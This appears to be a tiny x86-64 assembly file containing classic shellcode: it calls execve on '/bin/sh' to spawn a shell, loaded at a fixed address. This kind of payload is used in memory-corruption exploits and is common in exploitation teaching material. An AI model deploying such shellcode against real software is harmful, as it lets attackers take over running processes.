    [BITS 64]
    [ORG 0xFAC800]

    global _start

_start:
    mov eax, 59
    mov rdi, path
    xor esi, esi
    xor edx, edx
    syscall

path: db "/bin/sh", 0
